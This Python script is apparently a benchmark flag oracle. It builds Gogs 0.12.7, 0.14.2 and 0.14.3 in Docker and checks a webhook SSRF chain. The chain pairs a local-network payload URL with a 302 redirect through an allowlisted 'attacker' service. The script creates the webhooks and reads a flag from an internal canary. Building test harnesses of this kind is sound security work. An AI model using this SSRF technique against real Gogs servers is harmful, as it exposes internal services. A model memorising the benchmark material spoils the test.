#!/usr/bin/env python3
"""Flag differential oracle for gogs-cve-2026-47267.

Chain: CVE-2022-1285 (webhook SSRF via local-network payload URLs)
     -> CVE-2026-47267 (redirect bypass of the localCIDR check).

V0 = Gogs 0.12.7  (webhook delivery does NOT re-check local addresses)
V1 = Gogs 0.14.2  (CVE-2022-1285 fix: delivery re-checks; redirects still followed) <- target
V2 = Gogs 0.14.3  (CVE-2026-47267 fix: delivery refuses all redirects)

Infrastructure (same docker network):
  - canary: internal-only HTTP service; /flag returns the PCB flag. No host port.
  - attacker: HTTP service on host port 33690; every request -> 302 to canary.

seed channel (CVE-2022-1285): API-created webhook whose payload URL is
http://canary:8000/flag.  V0 delivers it (no re-check) -> flag appears in the
delivery record.  V1 refuses the delivery (local address) -> no response body.

residual channel (CVE-2026-47267): API-created webhook whose payload URL is
http://attacker:8000/cb (attacker is allowlisted in app.ini so the payload URL
itself passes the localCIDR check).  V1 follows the 302 and records the canary
response (flag).  V2 refuses the redirect -> delivery records only the error.
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import gogs_util as gu  # noqa: E402

sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"


def _setup_env(version: str) -> bool:
    """Install Gogs (first run) and create the repo. Returns True when ready."""
    if not gu.wait_ready(version, timeout=240):
        return False
    if not gu.install_gogs(version):
        # install may already have been done by a previous setup pass; only
        # give up if the instance is not reachable at all.
        if not gu.wait_ready(version, timeout=90):
            return False
    time.sleep(8)
    if not gu.wait_ready(version, timeout=240):
        return False
    # v1/v2 entrypoint patches app.ini and restarts Gogs: ride out the window
    time.sleep(12)
    token = None
    for _ in range(10):
        try:
            token = gu.create_token(version)
            break
        except Exception:
            time.sleep(6)
    if not token:
        return False
    # Repo may already exist from an earlier setup pass; CreateRepository 500s
    # when the bare repo directory exists, so check first.
    import requests as _requests
    try:
        _r = _requests.get(
            f"{gu.base_url(version)}/api/v1/repos/{gu.ADMIN_USER}/{gu.REPO_NAME}",
            headers={"Authorization": f"token {token}"}, timeout=10)
        if _r.status_code == 200:
            return True
    except Exception:
        pass
    for _ in range(10):
        try:
            gu.create_repo(version, token)
            return True
        except Exception as e:
            time.sleep(6)
    return False


def _deliver(version: str, url: str) -> dict:
    """Create hook + test delivery, reading the delivery record with retries.

    On v1/v2 the entrypoint patches app.ini (LOCAL_NETWORK_ALLOWLIST) and
    restarts Gogs shortly after first install; retry once if we hit the
    pre-restart window and see the local-address refusal.
    """
    token = gu.create_token(version)
    hook_id = gu.create_webhook_api(version, token, url)
    gu.trigger_test_delivery(version, hook_id)
    body = gu.read_hook_delivery_body(version, hook_id)
    if "implicitly blocked" in body and version in ("v1", "v2"):
        time.sleep(12)
        gu.trigger_test_delivery(version, hook_id)
        body = gu.read_hook_delivery_body(version, hook_id)
    return {"ok": FLAG in body, "delivery_body": body[:400]}


def seed_exploit(*, version="v0"):
    if not _setup_env(version):
        return {"ok": False, "delivery_body": "env setup failed"}
    return _deliver(version, "http://canary:8000/flag")


def residual_exploit(*, version="v1"):
    if not _setup_env(version):
        return {"ok": False, "delivery_body": "env setup failed"}
    return _deliver(version, "http://attacker:8000/cb")


def mechanism_scope(candidate) -> bool:
    return True


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, None, mechanism_scope)
    o.prime_seed(seed_exploit)
    return o


def gate() -> dict:
    seed_v0 = seed_exploit(version="v0")
    seed_v1 = seed_exploit(version="v1")
    res_v1 = residual_exploit(version="v1")
    res_v2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": seed_v0["ok"],
        "seed_closed_on_v1": not seed_v1["ok"],
        "residual_reaches_flag_on_v1": res_v1["ok"],
        "residual_blocked_on_v2": not res_v2["ok"],
        "seed_v1_body": seed_v1["delivery_body"][:120],
        "residual_v2_body": res_v2["delivery_body"][:120],
        "passed": all([
            seed_v0["ok"],
            not seed_v1["ok"],
            res_v1["ok"],
            not res_v2["ok"],
        ]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    # side services ready?
    deadline = time.time() + 120
    while time.time() < deadline:
        try:
            import urllib.request
            urllib.request.urlopen("http://127.0.0.1:33690/cb", timeout=3)
            break
        except Exception:
            time.sleep(3)
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
